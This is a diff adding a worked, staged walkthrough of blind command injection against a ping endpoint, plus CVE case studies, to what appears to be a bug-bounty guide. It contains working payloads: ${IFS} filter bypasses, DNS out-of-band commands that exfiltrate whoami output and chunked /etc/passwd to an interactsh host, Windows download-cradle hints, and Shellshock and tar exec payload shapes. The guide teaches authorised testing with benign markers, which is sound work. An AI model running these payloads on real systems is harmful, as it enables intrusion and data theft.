@@ -429,6 +429,66 @@ CLEAN UP:
 ```
 > **The restraint:** for bug bounty, **`id` (or an OOB `whoami`) and stop.** RCE is already the top severity; reading customer data or planting persistence adds risk, not bounty. Same discipline as the RFI/LFI/SSRF guides.
 
+## 13.1 The full attack, end-to-end — a blind, filtered command injection from probe to RCE
+
+> *In plain words:* every probe and payload above is a piece; this is the **whole board played out on the wire** against one realistic target — a network-diagnostics endpoint that runs `ping <host>` and returns only `{"reachable":true}` (no command output, spaces filtered). This is what **most real command injection actually looks like** — blind and lightly filtered — so read it once and the "no output ≠ not vulnerable" instinct becomes muscle memory. Every value is a **benign marker**; the moment an OOB `whoami` lands, you stop.
+
+**Stage 0 — Baseline (learn "normal"; find the command).**
+```http
+POST /api/net/ping HTTP/2
+Host: target.com
+Content-Type: application/json
+
+{"host":"127.0.0.1"}
+```
+```http
+HTTP/2 200 OK
+{"reachable":true}                    ← no raw output — the app runs `ping <host>` and returns only a verdict = BLIND by design
+```
+> **Verdict:** the feature clearly shells out to `ping`, but returns a boolean, not stdout. So in-band reading is off the table before we start — we'll need **time** or **OOB**. (A beginner stops here seeing "no output." That's the mistake §2.3 warns about.)
+
+**Stage 1 — Classify observability + discover the filter (probe, don't guess).**
+```
+① {"host":"127.0.0.1;id"}            → 200 {"reachable":true}      (no uid= → confirmed NOT in-band)
+② {"host":"127.0.0.1;sleep 5"}       → 200 in ~30ms + {"reachable":false}   (the SPACE broke it → input filtered/rejected)
+③ {"host":"127.0.0.1;sleep${IFS}5"}  → 200 in ~5.02s               (delay! spaces must be ${IFS}; execution is real)
+④ repeat ③ ×3                        → 5.01s, 5.03s, 5.00s          (consistent → not jitter; BLIND TIME-BASED confirmed)
+```
+> **Classification:** probe ① rules out in-band; probe ② reveals a **space filter**; probe ③ beats it with **`${IFS}`** (the shell's internal field separator — a space with no space character, §10) *and* proves execution via a reliable delay; probe ④'s repeatability excludes network jitter (§7). We now know: `;` passes, spaces need `${IFS}`, and the sink executes. Time works — but an **OOB channel is a stronger, faster proof**, so escalate to DNS.
+
+**Stage 2 — OOB confirm (turn "a delay happened" into "the server contacted MY host").**
+```http
+POST /api/net/ping ...
+{"host":"127.0.0.1;nslookup${IFS}cmdi.k7f2p.oast.pro"}
+```
+```
+[your interactsh listener]
+  DNS A  cmdi.k7f2p.oast.pro   from 203.0.113.44   ← the TARGET's egress IP, not yours = a real, non-FP hit
+```
+> The callback arriving **from the server's IP** (not your testing box) is what makes this un-false-positive-able (§8): only code running *on the target* could have issued that lookup.
+
+**Stage 3 — Blind exfil (turn "it ran" into "here is the server's identity").**
+```http
+POST /api/net/ping ...
+{"host":"127.0.0.1;nslookup${IFS}$(whoami).k7f2p.oast.pro"}
+```
+```
+[interactsh]  DNS A  www-data.k7f2p.oast.pro  from 203.0.113.44     ← you just READ the server's user over DNS
+```
+For a file, chunk it into DNS labels (§12): `…$(cat${IFS}/etc/passwd|base64|tr${IFS}-d${IFS}'='|head${IFS}-c60)…` → reassemble the labels at your listener. **Stop at enough to prove impact** — one identity read is the report; don't dump customer data.
+
+**Stage 4 — Report-grade proof, then STOP.** The `www-data.k7f2p.oast.pro` callback **is** a complete Critical: it proves the server executed `whoami` and leaked the result to a host you control — remote code execution, blind but undeniable. Do **not** upgrade to a reverse shell (§11) or read further (§13). Report it as **CWE-78, CVSS `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` ≈ 9.8 Critical**, with the four stages above as the reproduction.
+
+**What each stage proved (the transferable arc):**
+```
+Stage 0  baseline        → the feature shells out (ping) and is BLIND (verdict only, no stdout)
+Stage 1  probe matrix     → not in-band · a space filter · ${IFS} beats it · repeatable delay = real execution (no jitter)
+Stage 2  OOB DNS          → the callback from the TARGET's IP confirms server-side execution (no false positive)
+Stage 3  $(whoami) exfil  → "it ran" upgraded to "here is the server's user" — a concrete, benign-marker Critical
+Stage 4  stop + report    → RCE proven out-of-band; no shell, no data theft, CWE-78 ~9.8
+```
+This is the skeleton nearly every blind command-injection finding hangs on. The *same arc* re-skins for the harder cases: swap Stage 1's `${IFS}` for the WAF matrix (`c''at`, globbing `/???/c?t`, §10); swap the JSON body for a **header/User-Agent/filename** sink (§30 in the Q&A); swap the `;` separator for **argument injection** when separators are filtered (§9) — Stages 0/2/4 (baseline, OOB-confirm, safe-stop) never change.
+
 ---
 
 # 14. Special Sinks (ImageMagick, ffmpeg, git, tar, Windows)
@@ -467,6 +527,34 @@ OOB / EXFIL (Windows):    & nslookup %COMPUTERNAME%.YOUR.oast.fun      & powersh
 BENIGN PROOF:             & echo CMDI-7f3a9    & whoami    & hostname    & ver
 ```
 > **If this → then that:** Linux separators/`sleep` do nothing but `&ver`/`&whoami` returns output → it's **Windows**. Use `&`/`|` separators, `^`/`""` to evade char filters, **env-var substring** or **FOR loops** to rebuild blocked keywords, and **`powershell -enc`** when quotes/spaces are filtered. For a shell, a **download cradle** (`certutil`/`bitsadmin`/`curl`/PowerShell `IWR`/`IEX`) fetches your payload — but for bug bounty a single `whoami`/`echo` marker (or an OOB `%COMPUTERNAME%` callback) is enough proof. Mind: cmd uses `::`/`rem` not `#` for comments, and percent-vars (`%VAR%`) expand at parse time.
+
+---
+
+# Real-world command-injection case studies (learn the pattern, not just the payload)
+
+> Each is a documented landmark. Read them for the **shape** — attacker text reaching a shell (or a shell-happy helper) from a place the developer didn't picture as "a command." That shape is exactly what §13.1 reproduces.
+
+### Case 1 — Shellshock (CVE-2014-6271): the sink wasn't a form field, it was an *environment variable*
+- **What:** Bash executed trailing commands hidden in specially-crafted environment-variable *function definitions*. Any service that copied attacker input into a Bash env var — **CGI scripts** (HTTP headers like `User-Agent`/`Referer` become `HTTP_USER_AGENT` env vars), DHCP clients, OpenSSH `ForceCommand` — became **unauthenticated RCE**. Payload: `() { :;}; <command>` in a header. Mass-exploited within days.
+- **Mechanism:** command injection through an **env-var channel**, not a shell metacharacter in a visible parameter (§2.4, §Q30).
+- **Lesson:** cmdi is anywhere attacker text reaches a shell — test **headers, User-Agent, filenames, and env-var-derived values**, not just the obvious `host=` box.
+
+### Case 2 — ImageTragick (CVE-2016-3714): "upload a profile picture" → RCE
+- **What:** ImageMagick's delegate handling let a crafted **MVG/SVG** image run shell commands during a routine convert/resize/thumbnail. A plain image-upload feature became RCE (§14).
+- **Mechanism:** the injection is a **crafted input file**, not a separator — the *processor* is the shell (`fill 'url(https://x"|<cmd>")'`).
+- **Lesson:** a "processor sink" (ImageMagick/Ghostscript/ffmpeg/exiftool) is command injection wearing a different hat — pair with the FileUpload kit to land the file.
+
+### Case 3 — GitLab / ExifTool (CVE-2021-22205 via CVE-2021-22204): unauthenticated RCE, exploited in the wild
+- **What:** GitLab passed uploaded images to **ExifTool**, which had a **DjVu-metadata command injection** — so an unauthenticated image upload to GitLab yielded RCE. It was weaponized broadly (including ransomware) because it needed no login.
+- **Mechanism:** file → metadata parser → shell — a chain of *processor* command injection reachable pre-auth.
+- **Lesson:** the highest-impact cmdi is often **unauthenticated and buried in a dependency's parser** — fingerprint the processing library/version and match its CVE, don't only fuzz the front-end field.
+
+### Case 4 — Router/appliance diagnostic pages & the argument-injection renaissance (the §13.1 pattern in the wild)
+- **What:** a long tail of **D-Link/Netgear/Zyxel/…** CVEs where a web "ping/traceroute/nslookup" tool concatenates the `host` field straight into a shell command — the exact `POST …/ping {"host":"…;<cmd>"}` shape from §13.1. Modern web apps recreate it via **argument injection**: user input becomes an `argv` flag to `git`/`curl`/`tar` (`ext::sh`, `-o /webroot/shell`, `--checkpoint-action=exec=`, §9) even when separators are filtered.
+- **Mechanism:** unsanitized input into a shell command line, or into an option of a CLI tool (CWE-78 / CWE-88).
+- **Lesson:** network-utility features and any "we shell out to a CLI tool" endpoint are prime, reliable Criticals — and when `;`/`|` are filtered, **argument injection** keeps the door open.
+
+> **The through-line:** in every case the reported finding is **RCE**, and the "bug" (a header reaching Bash, a crafted image, a parser flaw, a `host` field) is named as the *mechanism*. Prove yours with a benign marker exactly like §13.1, and write it up the same way (§20).
 
 ---
 
